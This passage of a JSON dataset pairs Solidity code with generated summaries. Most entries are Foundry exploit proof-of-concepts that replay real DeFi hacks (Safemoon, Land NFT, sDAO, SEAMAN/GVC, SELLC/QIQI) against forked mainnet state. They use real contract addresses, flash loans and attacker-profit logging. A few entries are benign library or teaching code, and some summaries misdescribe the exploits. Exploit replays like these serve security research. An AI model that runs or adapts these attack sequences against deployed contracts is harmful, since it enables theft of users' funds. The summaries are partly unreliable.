tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(\n            trade\n        );\n    }\n\n    function swappingTokensForBnb(uint256 tokenAmount) private {\n        address[] memory path = new address[](2);\n        path[0] = address(sfmoon);\n        path[1] = address(weth);\n\n        ISafeSwapTradeRouter tradeRouter = ISafeSwapTradeRouter(\n            sfmoon.uniswapV2Router().routerTrade()\n        );\n        sfmoon.approve(address(sfmoon.uniswapV2Router()), tokenAmount);\n\n        uint256 feeAmount = tradeRouter.getSwapFees(tokenAmount, path);\n        ISafeSwapTradeRouter.Trade memory trade = ISafeSwapTradeRouter.Trade({\n            amountIn: tokenAmount,\n            amountOut: 0,\n            path: path,\n            to: payable(address(this)),\n            deadline: block.timestamp\n        });\n        tradeRouter.swapExactTokensForTokensWithFeeAmount{value: feeAmount}(\n            trade\n        );\n    }\n}",
        "summary": "This code is a Solidity smart contract that defines a test for an attack on the Safemoon protocol. The contract imports several interfaces for interacting with other contracts, including the Uniswap router, the Safemoon token, and the PancakeSwap pair. \n\nThe main function, `doBurnHack()`, executes the attack by swapping some amount of BNB for Safemoon tokens, then calling the `burn()` function on the Safemoon token contract to burn some of the tokens. Finally, it swaps the remaining tokens back to BNB and transfers a portion of the resulting BNB to the caller.\n\nThe test functions `testMint()` and `testBurn()` are used to verify the success of the attack by checking the balance of the attacker's address after executing the `doBurnHack()` function. The `pancakeCall()` function is called by the PancakeSwap pair contract during a swap, and it triggers the execution of the `doBurnHack()` function.",
        "id": "af595989-acf1-4ced-8ce6-7a916a338fd6"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {ERC20} from \"../tokens/ERC20.sol\";\n\n/// @notice Safe ETH and ERC20 transfer library that gracefully handles missing return values.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol)\n/// @dev Use with caution! Some functions in this library knowingly create dirty bits at the destination of the free memory pointer.\n/// @dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.\nlibrary SafeTransferLib {\n    /*//////////////////////////////////////////////////////////////\n                             ETH OPERATIONS\n    //////////////////////////////////////////////////////////////*/\n\n    function safeTransferETH(address to, uint256 amount) internal {\n        bool success;\n\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Transfer the ETH and store if it succeeded or not.\n            success := call(gas(), to, amount, 0, 0, 0, 0)\n        }\n\n        require(success, \"ETH_TRANSFER_FAILED\");\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            ERC20 OPERATIONS\n    //////////////////////////////////////////////////////////////*/\n\n    function safeTransferFrom(\n        ERC20 token,\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        bool success;\n\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Get a pointer to some free memory.\n            let freeMemoryPointer := mload(0x40)\n\n            // Write the abi-encoded calldata into memory, beginning with the function selector.\n            mstore(freeMemoryPointer, 0x23b872dd00000000000000000000000000000000000000000000000000000000)\n            mstore(add(freeMemoryPointer, 4), from) // Append the \"from\" argument.\n            mstore(add(freeMemoryPointer, 36), to) // Append the \"to\" argument.\n            mstore(add(freeMemoryPointer, 68), amount) // Append the \"amount\" argument.\n\n            success := and(\n                // Set success to whether the call reverted, if not we check it either\n                // returned exactly 1 (can't just be non-zero data), or had no return data.\n                or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),\n                // We use 100 because the length of our calldata totals up like so: 4 + 32 * 3.\n                // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.\n                // Counterintuitively, this call must be positioned second to the or() call in the\n                // surrounding and() call or else returndatasize() will be zero during the computation.\n                call(gas(), token, 0, freeMemoryPointer, 100, 0, 32)\n            )\n        }\n\n        require(success, \"TRANSFER_FROM_FAILED\");\n    }\n\n    function safeTransfer(\n        ERC20 token,\n        address to,\n        uint256 amount\n    ) internal {\n        bool success;\n\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Get a pointer to some free memory.\n            let freeMemoryPointer := mload(0x40)\n\n            // Write the abi-encoded calldata into memory, beginning with the function selector.\n            mstore(freeMemoryPointer, 0xa9059cbb00000000000000000000000000000000000000000000000000000000)\n            mstore(add(freeMemoryPointer, 4), to) // Append the \"to\" argument.\n            mstore(add(freeMemoryPointer, 36), amount) // Append the \"amount\" argument.\n\n            success := and(\n                // Set success to whether the call reverted, if not we check it either\n                // returned exactly 1 (can't just be non-zero data), or had no return data.\n                or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),\n                // We use 68 because the length of our calldata totals up like so: 4 + 32 * 2.\n                // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.\n                // Counterintuitively, this call must be positioned second to the or() call in the\n                // surrounding and() call or else returndatasize() will be zero during the computation.\n                call(gas(), token, 0, freeMemoryPointer, 68, 0, 32)\n            )\n        }\n\n        require(success, \"TRANSFER_FAILED\");\n    }\n\n    function safeApprove(\n        ERC20 token,\n        address to,\n        uint256 amount\n    ) internal {\n        bool success;\n\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Get a pointer to some free memory.\n            let freeMemoryPointer := mload(0x40)\n\n            // Write the abi-encoded calldata into memory, beginning with the function selector.\n            mstore(freeMemoryPointer, 0x095ea7b300000000000000000000000000000000000000000000000000000000)\n            mstore(add(freeMemoryPointer, 4), to) // Append the \"to\" argument.\n            mstore(add(freeMemoryPointer, 36), amount) // Append the \"amount\" argument.\n\n            success := and(\n                // Set success to whether the call reverted, if not we check it either\n                // returned exactly 1 (can't just be non-zero data), or had no return data.\n                or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),\n                // We use 68 because the length of our calldata totals up like so: 4 + 32 * 2.\n                // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.\n                // Counterintuitively, this call must be positioned second to the or() call in the\n                // surrounding and() call or else returndatasize() will be zero during the computation.\n                call(gas(), token, 0, freeMemoryPointer, 68, 0, 32)\n            )\n        }\n\n        require(success, \"APPROVE_FAILED\");\n    }\n}\n",
        "summary": "This is a Solidity library called SafeTransferLib that provides functions for transferring ETH and interacting with ERC20 tokens safely. It uses assembly code to handle missing return values and checks whether the calls succeeded or failed. The library includes functions for transferring ETH and ERC20 tokens, as well as approving token transfers. However, the library does not check whether a token has code or not, which is the caller's responsibility.",
        "id": "7d6d9d5a-3df6-460b-a7a5-46e86db61726"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  ILand Land =  ILand(0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a);\n  address victim = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 14163041); //fork mainnet at block 14163041\n  }\n\n  function testExploit() public {\n    cheats.startPrank(0x6FB0B915D0e10c3B2ae42a5DD879c3D995377A2C);\n    console.log(\"Before exploiting, victim owned NFT:\",Land._numNFTPerAddress(victim)); // 2762 is the number of NFTs in the victim's account.\n    for (uint i = 0; i < 100; i++) {  // let's try to burn 100 nfts\n\n    Land._burn(victim, victim, 3738); // _burn function that was set to be called was set in a public state, anyone can burn any user's NFT.\n}\n    console.log(\"After exploiting, victim owned NFT:\",Land._numNFTPerAddress(victim));\n  }\n}\n",
        "summary": "This is a Solidity smart contract that includes a test case designed to exploit a vulnerability in a different smart contract. It imports two other contracts, \"Test.sol\" and \"interface.sol,\" and creates instances of them, as well as a contract called \"CheatCodes.\" This contract sets up a function called \"setUp()\" that initializes values for future tests. The function \"testExploit()\" then calls a function from the \"CheatCodes\" contract which sets up a forked network and then uses a loop to call a public burn function from the imported \"interface.sol\" contract to burn one user's NFT tokens. The loop runs 100 times in an attempt to burn 100 NFTs. Finally, the function logs the number of NFTs owned by the victim, both before and after the exploit.",
        "id": "22d7edd1-78a9-4a98-b058-0b740bf1edea"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/8olidity/status/1594693686398316544\n// https://twitter.com/CertiKAlert/status/1594615286556393478\n// @TX\n// https://bscscan.com/tx/0xb3ac111d294ea9dedfd99349304a9606df0b572d05da8cedf47ba169d10791ed\n\ninterface sDAO is IERC20{\n    function stakeLP(uint256 _lpAmount) external;\n    function withdrawTeam(address _token) external;\n    function getPerTokenReward() external view returns(uint);\n    function userLPStakeAmount(address account) external view returns(uint);\n    function userRewardPerTokenPaid(address account) external view returns(uint);\n    function totalStakeReward() external view returns(uint);\n    function lastTotalStakeReward() external view returns(uint);\n    function pendingToken(address account) external view returns(uint);\n    function getReward() external;\n}\n\ncontract ContractTest is DSTest{\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    sDAO SDAO = sDAO(0x6666625Ab26131B490E7015333F97306F05Bf816);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x333896437125fF680f146f18c8A164Be831C4C71);\n    address dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23241440);\n    }\n\n    function testExploit() public{\n        USDT.approve(address(Router), type(uint).max);\n        SDAO.approve(address(Router), type(uint).max);\n        Pair.approve(address(Router), type(uint).max);\n        Pair.approve(address(SDAO), type(uint).max);\n        SDAO.approve(address(this), type(uint).max);\n        DVM(dodo).flashLoan(0, 500 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        USDTToSDAO();\n        addUSDTsDAOLiquidity();\n        SDAO.stakeLP(Pair.balanceOf(address(this)) / 2);\n        // SDAO.transfer(address(Pair), SDAO.balanceOf(address(this)));\n        SDAO.transferFrom(address(this), address(Pair), SDAO.balanceOf(address(this))); // change totalStakeReward > lastTotalStakeReward\n        SDAO.withdrawTeam(address(Pair));\n        Pair.transfer(address(SDAO), 13 * 1e15);\n        // uint total = SDAO.totalStakeReward();\n        // uint lasttotal =SDAO.lastTotalStakeReward();\n        // uint stake = SDAO.userLPStakeAmount(address(this));\n        // uint paid = SDAO.userRewardPerTokenPaid(address(this));\n        // uint reward = SDAO.getPerTokenReward();\n        // uint pending = SDAO.pendingToken(address(this));\n        SDAO.getReward();\n        SDAOToUSDT();\n        USDT.transfer(dodo, 500 * 1e18);\n    }\n\n    function USDTToSDAO() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(SDAO);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            250 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp + 60\n        );\n    }\n\n    function addUSDTsDAOLiquidity() internal{\n        Router.addLiquidity(\n            address(USDT),\n            address(SDAO),\n            USDT.balanceOf(address(this)),\n            SDAO.balanceOf(address(this)) / 2,\n            0,\n            0,\n            address(this),\n            block.timestamp + 60\n        );\n    }\n\n\n    function SDAOToUSDT() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(SDAO);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            SDAO.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp + 60\n        );\n    }\n\n}",
        "summary": "This code defines a contract called `ContractTest` which is used to exploit a vulnerability in a smart contract on the Binance Smart Chain called `sDAO`. The `ContractTest` contract uses `cheatCodes` to create a fork of the Binance Smart Chain at a specific block number, and then executes a flash loan of 500 USDT tokens from a DODO exchange. It then exchanges some of the USDT tokens for SDAO tokens, adds liquidity to the SDAO-USDT pair, stakes half the SDAO-USDT LP tokens in the `sDAO` contract, and then transfers the LP tokens back to the SDAO-USDT pair contract, withdrawing the reward tokens in the process. Finally, it exchanges the SDAO tokens back to USDT and repays the flash loan with 500 USDT tokens. This is done to exploit a flaw in the reward calculation mechanism in the `sDAO` smart contract.",
        "id": "111fe832-c5e5-4911-9cdf-aee28215eef0"
    },
    {
        "code": "//SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1597493955939405825\n// https://twitter.com/CertiKAlert/status/1597513374841044993\n// https://twitter.com/BeosinAlert/status/1597535796621631489\n// @TX\n// https://bscscan.com/tx/0x6f1af27d08b10caa7e96ec3d580bf39e29fd5ece00abda7d8955715403bf34a8\n\ncontract ContractTest is DSTest{\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 SEAMAN = IERC20(0x6bc9b4976ba6f8C9574326375204eE469993D038);\n    IERC20 GVC = IERC20(0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;\n    address Pair = 0x6637914482670f91F43025802b6755F27050b0a6;\n\n    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 23467515);\n    }\n\n    function testExploit() public{\n        DVM(dodo).flashLoan(0, 800_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        USDT.approve(address(Router), type(uint).max);\n        USDTToSEAMAN();\n        USDTToGVC();\n        for(uint i = 0; i < 20; i++){\n            SEAMAN.transfer(Pair, 1);\n        }\n        GVCToUSDT();\n        USDT.transfer(dodo, 800_000 * 1e18);\n    }\n\n    function USDTToSEAMAN() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(SEAMAN);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            10 * 1e9,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function USDTToGVC() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(GVC);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            500_000 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function GVCToUSDT() internal{\n        GVC.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(GVC);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            GVC.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}",
        "summary": "This is a Solidity smart contract that performs an exploit on a specific version of a decentralized exchange (DEX) called Dodo. The contract starts by importing relevant interfaces and defining contract variables. The `setUp` function sets up a fork on the Binance Smart Chain network, and the `testExploit` function executes the attack on the Dodo DEX. The `DPPFlashLoanCall` function is the actual exploit code that performs token swaps to manipulate token prices and trade imbalances to result in a profit for the attacker. Overall, this code demonstrates the potential vulnerabilities of decentralized exchanges and the importance of security audits and code testing.",
        "id": "a516afa3-53d5-4be1-813a-3ed8352c99dd"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.21;\n\ncontract EtherReceiver {\n\n    function () public payable {}\n}\n\ncontract EtherSender {\n\n    EtherReceiver private receiverAdr = new EtherReceiver();\n\n    function sendEther(uint _amount) public payable {\n        if (!address(receiverAdr).send(_amount)) {\n            //handle failed send\n        }\n    }\n\n    function callValueEther(uint _amount) public payable {\n        require(address(receiverAdr).call.value(_amount).gas(21000)());\n    }\n\n    function transferEther(uint _amount) public payable {\n        address(receiverAdr).transfer(_amount);\n    }\n}\n",
        "summary": "This is a Solidity smart contract consisting of two contracts: \"EtherReceiver\" and \"EtherSender.\" The EtherReceiver contract has a function that accepts funds (Ether) received from other contracts or accounts. The EtherSender contract defines three functions that send Ether to the \"EtherReceiver\" contract. The \"sendEther\" function sends funds and handles a failed transaction, whereas the \"callValueEther\" function uses the \"call\" method to send funds with a given amount of gas and the \"transferEther\" function uses the \"transfer\" method to send funds. However, this code does not come with a professional audit and thus should be used at one's own risk.",
        "id": "a575d834-e347-4d6b-a1c8-ec16edb6982f"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Selector{\n    // event \u8fd4\u56demsg.data\n    event Log(bytes data);\n\n    // \u8f93\u5165\u53c2\u6570 to: 0x2c44b726ADF1963cA47Af88B284C06f30380fC78\n    function mint(address /*to*/) external{\n        emit Log(msg.data);\n    } \n\n    // \u8f93\u51faselector\n    // \"mint(address)\"\uff1a 0x6a627842\n    function mintSelector() external pure returns(bytes4 mSelector){\n        return bytes4(keccak256(\"mint(address)\"));\n    }\n\n    // \u4f7f\u7528selector\u6765\u8c03\u7528\u51fd\u6570\n    function callWithSignature() external returns(bool, bytes memory){\n        // \u53ea\u9700\u8981\u5229\u7528`abi.encodeWithSelector`\u5c06`mint`\u51fd\u6570\u7684`selector`\u548c\u53c2\u6570\u6253\u5305\u7f16\u7801\n        (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(0x6a627842, 0x2c44b726ADF1963cA47Af88B284C06f30380fC78));\n        return(success, data);\n    }\n}\n",
        "summary": "This code defines a contract called `Selector` that has three functions:\n\n1. `mint` function that emits an event with `msg.data` as its parameter.\n\n2. `mintSelector` function that returns the selector hash for the `mint` function (hash of the function signature).\n\n3. `callWithSignature` function that makes a call to the `mint` function using the selector obtained from `mintSelector` along with an Ethereum address as its parameter. It then returns a boolean value indicating whether the call was successful and the data returned as bytes.",
        "id": "99d10021-6b62-4e4b-bbe4-7aa186eb2e0b"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// by 0xAA\npragma solidity ^0.8.4;\n\ncontract SelectorClash {\n    bool public solved; // \u653b\u51fb\u662f\u5426\u6210\u529f\n\n    function putCurEpochConPubKeyBytes(bytes memory _bytes) public {\n        require(msg.sender == address(this), \"Not Owner\");\n        solved = true;\n    }\n\n    function executeCrossChainTx(bytes memory _method, bytes memory _bytes) public returns(bool success){\n        (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, \"(bytes,bytes,uint64)\"))), abi.encode(_bytes)));\n    }\n\n    function secretSlector() external pure returns(bytes4){\n        return bytes4(keccak256(\"putCurEpochConPubKeyBytes(bytes)\"));\n    }\n\n    function hackSlector() external pure returns(bytes4){\n        return bytes4(keccak256(\"f1121318093(bytes,bytes,uint64)\"));\n    }\n}",
        "summary": "This code defines a contract called SelectorClash. The contract has four functions: \n\n1. `putCurEpochConPubKeyBytes`: This function sets a boolean variable called `solved` to true if the caller of the function is the contract itself.\n2. `executeCrossChainTx`: This function takes two byte arrays as input and calls a function dynamically using the method ID derived from the first byte array argument and the ABI-encoded data from the second byte array argument. If the call is successful, it returns success as true.\n3. `secretSlector`: This function returns the selector (method ID) of the `putCurEpochConPubKeyBytes` function encoded as a bytes4 value.\n4. `hackSlector`: This function returns a bytes4 value that does not correspond to any function in the contract and thus, may be used for functional collision attacks on some Ethereum clients.",
        "id": "63245568-f45e-4d14-8eef-fe3b8cdcca59"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : unclear US$\n// Attacker : https://bscscan.com/address/0xa3aa817587556c023e78b2285d381c68cee17069\n// Attack Contract : https://bscscan.com/address/0x9a366027e6be5ae8441c9f54455e1d6c41f12e3c\n// Attack Contract : https://bscscan.com/address/0xc2f54422c995f6c2935bc52b0f55a03c2f3e429c\n// Vulnerable Contract : https://bscscan.com/address/0xeaf83465025b4bf9020fdf9ea5fb6e71dc8a0779\n// Attack Tx : https://bscscan.com/tx/0xfe80df5d689137810df01e83b4bb51409f13c865e37b23059ecc6b3d32347136\n// Attack Tx : https://bscscan.com/tx/0x8a453c61f0024e8e11860729083088507a02a38100da8b0c3b2d558788662fa0\n\n// @Info\n// Vulnerable Contract Code : https://bscscan.com/address/0xeaf83465025b4bf9020fdf9ea5fb6e71dc8a0779#code\n\n// @Analysis\n// Post-mortem : https://www.google.com/\n// Twitter Guy : https://twitter.com/BlockSecTeam/status/1657715018908180480\n// Hacking God : https://www.google.com/\n\ninterface IStakingRewards {\n    function stake(address token, address token1, address token2, address up, uint256 amount) external;\n    function claim(address token, address token1) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);\n    IERC20 QIQI = IERC20(0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d);\n    Uni_Pair_V3 Pair = Uni_Pair_V3(0x4B1aC1E4B828EBC81FcaC587BEf64e4aDd1dBCEc);\n    Uni_Router_V2 Router = Uni_Router_V2(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);\n    IUniswapV2Factory Factory = IUniswapV2Factory(0x2c37655f8D942f2411d9d85a5FE580C156305070);\n    IStakingRewards StakingRewards = IStakingRewards(0xeaF83465025b4Bf9020fdF9ea5fB6e71dC8a0779);\n    TOKENA TokenA;\n    Exploiter exploiter;\n    Uni_Pair_V2 pair;\n    address[] expoiterList;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_187_317);\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(QIQI), \"QIQI\");\n        cheats.label(address(SELLC), \"SELLC\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(Factory), \"Factory\");\n        cheats.label(address(StakingRewards), \"StakingRewards\");\n    }\n\n    function testExploit() public {\n        deal(address(USDT), address(this), 1000 * 1e18);\n        stakeFactory(10);\n\n        cheats.warp(block.timestamp + 60 * 60);\n\n        TokenA = new TOKENA();\n        TokenA.mint(100);\n        Pair.flash(address(this), 10_000 * 1e18, 0, new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker QIQI balance after exploit\", QIQI.balanceOf(address(this)), QIQI.decimals()\n        );\n    }\n\n    function stakeFactory(uint256 amount) internal {\n        address account;\n        for (uint256 i; i < amount; i++) {\n            exploiter = new Exploiter();\n            expoiterList.push(address(exploiter));\n            USDT.transfer(address(exploiter), 100 * 1e18);\n            if (i == 0) {\n                account = address(0xa3aa817587556C023e78B2285D381C68CEe17069);\n            } else {\n                account = expoiterList[i - 1];\n            }\n            exploiter.stake(account);\n        }\n    }\n\n    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        QIQI.approve(address(Router), QIQI.balanceOf(address(this)));\n        TokenA.approve(address(Router), TokenA.balanceOf(address(this)));\n        Router.addLiquidity(\n            address(QIQI),\n            address(TokenA),\n            QIQI.balanceOf(address(this)),\n            TokenA.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n        claimFactory(10);\n        pair = Uni_Pair_V2(Factory.getPair(address(QIQI), address(TokenA)));\n        pair.approve(address(Router), pair.balanceOf(address(this)));\n        Router.removeLiquidity(\n            address(QIQI), address(TokenA), pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp\n        );\n        QIQI.transfer(address(Pair), 10_100 * 1e18);\n    }\n\n    function claimFactory(uint256 amount) internal {\n        for (uint256 i; i < amount; i++) {\n            exploiter = Exploiter(expoiterList[i]);\n            exploiter.claim(address(TokenA));\n        }\n    }\n}\n\ncontract Exploiter {\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);\n    IERC20 QIQI = IERC20(0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d);\n    IStakingRewards StakingRewards = IStakingRewards(0xeaF83465025b4Bf9020fdF9ea5fB6e71dC8a0779);\n\n    function stake(address account) external {\n        USDT.approve(address(StakingRewards), USDT.balanceOf(address(this)));\n        StakingRewards.stake(address(QIQI), address(SELLC), address(USDT), account, USDT.balanceOf(address(this)));\n    }\n\n    function claim(address _recipient) external {\n        StakingRewards.claim(address(QIQI), _recipient);\n        QIQI.transfer(msg.sender, QIQI.balanceOf(address(this)));\n    }\n}\n\ncontract TOKENA {\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    string public name = \"TokenA\";\n    string public symbol = \"TokenA\";\n    uint8 public decimals = 18;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint256 amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint256 amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that tests an exploit on a vulnerable contract. The vulnerable contract is defined through its interface, and tokens are defined and initialized. The test `testExploit` calls a series of functions that exploits the vulnerable contract, and the results are emitted through log events. The `Exploiter` contract is defined to be used by the test and has two functions, `stake` and `claim`. Finally, there is a token contract called `TOKENA` that is used in the exploit.",
        "id": "c8287cf3-b340-4608-8380-21f9516bcff9"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~95K US$\n// Attacker : https://bscscan.com/address/0xc67af66b8a72d33dedd8179e1360631cf5169160\n// Attack Contract : https://bscscan.com/address/0xf635fea87f0a8a444ede1dbb698d875dbb417829\n// Vulnerable Contract : https://bscscan.com/address/0x274b3e185c9c8f4ddef79cb9a8dc0d94f73a7675\n// Attack Tx : https://bscscan.com/tx/0x59ed06fd0d44aec351bed54f57eccec65874da5a25a0aa71e348611710ec05f3\n// Attack Tx : https://bscscan.com/tx/0x904e48ccc1a1eada85f2e3a6444debc428c55f8652ebbebe26e77d02be2902bf\n// Attack Tx : https://bscscan.com/tx/0x247e61bd0f41f9ec56a99558e9bbb8210d6375c2ed6efa4663ee6a960349b46d\n\n// @Info\n// Vulnerable Contract Code : https://bscscan.com/address/0x274b3e185c9c8f4ddef79cb9a8dc0d94f73a7675#code\n\n// @Analysis\n// Post-mortem : https://www.google.com/\n// Twitter Guy : https://twitter.com/AnciliaInc/status/1656337400329834496\n// Twitter Guy : https://twitter.com/AnciliaInc/status/1656341587054702598\n// Hacking God : https://www.google.com/\n\ninterface IStakingRewards {\n    function addLiquidity(address _token, address token1, uint256 amount1) external;\n    function sell(address token, address token1, uint256 amount) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 QIQI = IERC20(0x8121D345b16469F38Bd3b82EE2a547f6Be54f9C9);\n    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);\n    IUniswapV2Factory Factory = IUniswapV2Factory(0x2c37655f8D942f2411d9d85a5FE580C156305070);\n    Uni_Router_V2 Router = Uni_Router_V2(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);\n    Uni_Router_V2 officalRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    IStakingRewards StakingRewards = IStakingRewards(0x274b3e185c9c8f4ddEF79cb9A8dC0D94f73A7675);\n    Uni_Pair_V2 SellQILP = Uni_Pair_V2(0x4cd4Bf5079Fc09d6989B4b5B42b113377AD8d565);\n    Uni_Pair_V2 customLP;\n    SHITCOIN MYTOKEN;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_092_673);\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(address(QIQI), \"QIQI\");\n        cheats.label(address(SELLC), \"SELLC\");\n        cheats.label(address(Factory), \"Factory\");\n        cheats.label(address(Router), 